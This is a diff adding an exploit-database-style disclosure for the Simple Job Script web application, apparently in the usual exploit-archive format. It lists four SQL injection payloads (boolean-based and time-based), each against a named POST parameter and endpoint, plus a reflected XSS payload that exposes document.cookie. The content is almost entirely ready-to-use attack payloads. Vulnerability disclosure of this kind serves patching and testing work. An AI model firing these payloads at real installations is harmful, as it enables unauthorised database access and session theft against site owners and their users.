@@ -1,0 +1,48 @@
+# Exploit Title: Simple Job Script - Multiple Vulnerabilities
+# Date: 26.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://simplejobscript.com/
+# Download Link:
+https://github.com/niteosoft/simplejobscript/archive/master.zip
+# Demo Site: https://demo.simplejobscript.com
+# Version: Lastest
+# Tested on: Kali Linux
+# CVE: N/A
+
+----- PoC 1: SQLi -----
+
+Request: http://localhost/[PATH]/searched
+Vulnerable Parameter: landing_location (POST)
+Payload:
+landing_location=-1%20OR%203*2*1=6%20AND%20000405=000405%20--%20&landing_title=test
+
+
+
+----- PoC 2: SQLi -----
+
+Request: http://localhost/[PATH]/get_job_applications_ajax.php
+Vulnerable Parameter: job_id (POST)
+Payload: job_id=-1%20OR%203*2*1=6%20AND%20000615=000615%20--%20
+
+
+----- PoC 3: SQLi -----
+
+Request: http://localhost/[PATH]/register-recruiters
+Vulnerable Parameter: employerid (POST)
+Payload: if(now()=sysdate(),sleep(0),0)
+
+
+----- PoC 4: SQLi -----
+
+Request: http://localhost/[PATH]/delete_application_ajax.php
+Vulnerable Parameter: app_id (POST)
+Payload:
+app_id=(select(0)from(select(sleep(0)))v)/*'%2B(select(0)from(select(sleep(0)))v)%2B'"%2B(select(0)from(select(sleep(0)))v)%2B"*/
+
+
+----- PoC 5: XSS -----
+
+Request:
+http://localhost/[PATH]/jobs?_=1&job_type_value[]=Full%20time&srch_location_val[]=fulltime_ctype
+Vulnerable Parameter: job_type_value[] (GET)
+Payload: "><svg+onload%3Dalert(document.cookie)>
